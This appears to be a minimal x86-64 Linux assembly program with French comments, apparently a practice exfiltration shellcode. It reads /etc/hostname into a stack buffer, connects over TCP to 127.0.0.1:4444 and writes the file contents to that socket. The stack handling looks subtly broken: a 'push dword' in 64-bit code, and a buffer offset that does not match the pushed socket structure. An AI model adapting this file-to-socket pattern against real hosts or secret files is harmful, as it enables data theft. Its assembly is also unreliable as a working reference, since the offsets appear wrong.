section .data
    f db '/etc/hostname', 0

section .text
    global _start

_start:
    ; 1. OPEN
    mov rax, 2
    mov rdi, f
    xor rsi, rsi
    syscall
    
    ; 2. READ (64 octets sur la pile)
    mov rdi, rax
    sub rsp, 64
    mov rsi, rsp
    mov rdx, 64
    xor rax, rax
    syscall
    mov r13, rax ; Sauve le nombre d'octets lus

    ; 3. SOCKET
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov r12, rax ; Sauve le sockfd

    ; 4. CONNECT (127.0.0.1:4444)
    push dword 0x0100007f
    push word 0x5c11
    push word 2
    mov rsi, rsp
    mov rdi, r12
    mov rdx, 16
    mov rax, 42
    syscall

    ; 5. WRITE
    mov rdi, r12
    lea rsi, [rsp+16] ; On retrouve le buffer après la structure
    mov rdx, r13
    mov rax, 1
    syscall

    ; 6. EXIT
    mov rax, 60
    xor rdi, rdi
    syscall